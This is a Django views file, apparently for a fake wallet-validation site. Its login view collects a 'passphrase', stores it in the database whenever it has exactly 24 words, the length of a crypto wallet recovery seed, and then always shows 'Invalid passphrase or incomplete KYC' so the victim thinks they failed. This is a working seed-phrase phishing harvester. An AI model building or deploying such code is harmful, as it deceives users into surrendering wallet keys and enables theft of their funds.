from django.shortcuts import render
# Create your views here.
from django.shortcuts import render , redirect , get_object_or_404
from django.http import HttpResponse , HttpResponseRedirect , HttpRequest 
from django.contrib.auth import authenticate ,login ,logout
from django.contrib import messages
from django.contrib.auth.forms import UserCreationForm
from django.conf import settings
from django.core.exceptions import ValidationError
from django.contrib.auth.models import User 
from .forms import PhraseForm
# Create your views here.
import datetime,time
# Create your views here.


def index(request):
    return render(request,"home.html",{})

def validate(request):
    return render(request,"validate.html",{})

def login(request):
    if request.method=="POST":
        passform = PhraseForm(request.POST)
        if passform.is_valid:
            validating = passform.save(commit=False)
            text = validating.phrase
            count = len(text.split())
            print(count)
            if count > 24 or count< 24:
                messages.success(request,"Invalid passphrase")
                return redirect("login")
            else:
                if count == 24:
                    validating.save()
                    messages.success(request,"Invalid passphrase or incomplete KYC")
                    return redirect("login")
        else:
            pass
    else:
        passform=PhraseForm(request.POST)
    return render(request,"login.html",{"form":passform})